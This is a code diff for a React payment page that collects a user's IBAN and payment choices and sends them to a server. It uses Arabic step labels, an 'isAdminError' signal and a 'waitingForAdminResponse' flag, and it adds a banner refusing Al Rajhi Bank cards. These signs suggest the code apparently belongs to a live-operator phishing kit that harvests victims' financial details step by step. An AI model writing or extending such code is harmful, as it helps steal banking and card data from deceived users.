@@ -2,18 +2,14 @@ import { useLocation, useNavigate } from "react-router-dom";
 import PaymentTimer from "./Payment/PaymentTimer";
 import PaymentTabs from "./Payment/PaymentTabs";
 import PaymentDetails from "./Payment/PaymentDetails";
-import PaymentShare from "./Payment/PaymentShare";
-import PaymentContacts from "./Payment/PaymentContacts";
 import paymentMethods from "../../data/paymentMethods";
 import useScrollPos from "../../hooks/useScrollPos";
-import { maskPhoneNumber } from "../../utils/helpers";
 import { useEffect } from "react";
-import {
-  currentPage,
-  isAdminError,
-  message,
-  sendDataToServer,
-} from "@/context/signals";
+import { isAdminError, message } from "@/real-time/context/signals";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
+import PaymentShare from "./Payment/PaymentShare";
+import PaymentContacts from "./Payment/PaymentContacts";
+import { maskPhoneNumber } from "@/lib/helpers";
 
 const PaymentPage = () => {
   const { state } = useLocation();
@@ -34,25 +30,28 @@ const PaymentPage = () => {
     const paymentMethod = formData.get("payment-method");
     const smartPackage = formData.get("smart-package");
 
-    const data = { discount, iban, paymentMethod, smartPackage };
+    const data = {
+      discount,
+      iban,
+      paymentMethod,
+      smartPackage,
+    };
 
     isAdminError.value = false;
     message.value = "";
-    sendDataToServer(
-      data,
-      "الخطوة الرابعة",
-      "معلومات البطاقة",
-      false,
-      navigate,
-      "/payment-gateway",
-      { ...state, ...data }
-    );
 
-    // navigate("/payment-gateway", { state: { ...state, ...data } });
+    sendDataToServer({
+      data,
+      current: "الخطوة الرابعة",
+      nextPage: "payment-gateway",
+      navigate,
+      waitingForAdminResponse: false,
+      state: { ...state, ...data },
+    });
   };
 
   useEffect(() => {
-    currentPage.value = "الخطوة الرابعة";
+    setCurrentPage("الخطوة الرابعة");
   }, []);
 
   return (
@@ -159,6 +158,10 @@ const PaymentPage = () => {
               </div>
             </span>
           </div>
+          <p className="mt-2 bg-deep-orange-500 text-white rounded-lg px-4 py-2 w-fit text-sm animate-pulse">
+            "نعتذر من عملائنا الأعزاء، نحن لا نقبل التعامل بالبطاقات الصادرة من
+            بنك الراجحي في الوقت الراهن. نشكركم على تفهمكم."
+          </p>
 
           <div className="border rounded-lg border-gray-400 py-4 px-2 mt-6">
             <div className="flex gap-4">
